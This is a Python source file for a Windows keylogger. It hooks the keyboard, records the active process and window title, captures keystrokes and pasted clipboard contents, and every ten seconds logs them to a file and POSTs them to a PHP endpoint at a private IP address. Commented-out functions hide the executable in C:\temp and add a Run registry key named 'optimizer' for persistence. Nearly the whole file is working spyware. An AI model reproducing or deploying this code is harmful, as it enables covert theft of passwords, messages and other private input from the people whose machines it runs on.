import pyHook
from ctypes import *
import pythoncom
import pyHook
import urllib2
import urllib
import win32clipboard
import threading
import time
import os
import sys
import subprocess
from _winreg import *

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi


class logger:
    def __init__(self):
        self.fp=os.path.dirname(os.path.realpath("__file__"))
        self.file_name=sys.argv[0].split("\\")[-1]
        self.new_file_path=self.fp+"\\"+self.file_name
        #self.hideinf(self.new_file_path,self.file_name)
        #self.writeinreg(self.rpath)
        self.current_window=None
        self.info=""
        thread=threading.Thread(target=self.hook,)
        thread.start()
        self.dumpinfo()
       

    def hideinf(self,new_file_path,file_name):
      command="move "+new_file_path+" C:\\temp\\"+file_name
      if not os.path.exists("C:\\temp"):
         os.mkdir("C:\\temp")
      output=subprocess.check_output(command,stderr=subprocess.STDOUT,shell="True")
      self.rpath="C:\\temp\\"+file_name
      print output

    def writeinreg(self,path):
        keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
        key2change= OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)
        SetValueEx(key2change,"optimizer",0,REG_SZ,path)


    def curprocess(self):
        #opened window handle
        wh=user32.GetForegroundWindow()
        #process id
        pid=c_ulong(0)
        user32.GetWindowThreadProcessId(wh, byref(pid))
        procid="%d"%pid.value
        # grab the executable
        executable = create_string_buffer("\x00" * 512)
        h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
        psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
             # now read its title
        window_title = create_string_buffer("\x00" * 512)
        length = user32.GetWindowTextA(wh, byref(window_title),512)
        # print out the header if we're in the right process
        self.info=self.info+"\n"
        self.info=self.info+"[ PID: %s - %s - %s ]" % (procid, executable.value, window_title.value)
        self.info=self.info+"\n"
        # close handles
        kernel32.CloseHandle(wh)
        kernel32.CloseHandle(h_process)


    def keys(self,event):
       # check to see if target changed windows
       if event.WindowName != self.current_window:
           self.current_window = event.WindowName
           self.curprocess()
        # if they pressed a standard key
       if event.Ascii > 32 and event.Ascii < 127:
             self.info=self.info+chr(event.Ascii)
       else:
           # if [Ctrl-V], get the value on the clipboard
           if event.Key == "V":
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                self.info=self.info+"[PASTE] - %s" % (pasted_value)
           else:
                self.info=self.info+"[%s]" % event.Key
          # pass execution to next hook registered
       return True

    def hook(self):
        kl = pyHook.HookManager()
        kl.KeyDown = self.keys
             # register the hook and execute forever
        kl.HookKeyboard()
        pythoncom.PumpMessages()

    def dumpinfo(self):
       while 1==1:
        time.sleep(10)
        fil=open("l.txt","a")
        fil.write(self.info)
        self.sentoweb(self.info)
        self.info=""

    def sentoweb(self,info):
        url="http://192.168.56.101/l.php"
        value={'id':'100','msg':info}
        data=urllib.urlencode(value)
        req=urllib2.Request(url,data)
        try:
          response=urllib2.urlopen(req)
        except urllib2.URLError as e:
               r=e.reason
               print r
        
    

def main():
    t=logger()



if __name__ == "__main__":
    main()
